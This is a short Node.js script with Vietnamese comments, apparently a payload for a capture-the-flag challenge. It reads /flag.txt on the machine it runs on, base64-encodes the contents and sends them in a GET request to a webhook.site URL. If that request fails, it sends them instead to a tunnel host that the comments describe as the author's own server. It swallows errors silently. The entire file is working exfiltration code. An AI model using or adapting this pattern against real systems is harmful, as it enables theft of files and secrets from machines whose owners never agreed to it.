const fs = require('fs');
const http = require('http');

try {
    const flag = fs.readFileSync('/flag.txt', 'utf8');
    const b64flag = Buffer.from(flag).toString('base64');
    
    // Thử gửi qua HTTP thường
    http.get(`https://webhook.site/92d1c753-2019-464b-a435-1ed8d5243f71?f=${b64flag}`, (res) => {
        // Request thành công
    }).on('error', (e) => {
        // Nếu vẫn lỗi, thử gửi về chính server của bạn (Python server)
        // Thay IP/Domain tunnel của bạn vào đây
        http.get(`http://pwhow-42-114-206-90.a.free.pinggy.link/success?flag=${b64flag}`);
    });
} catch (err) {}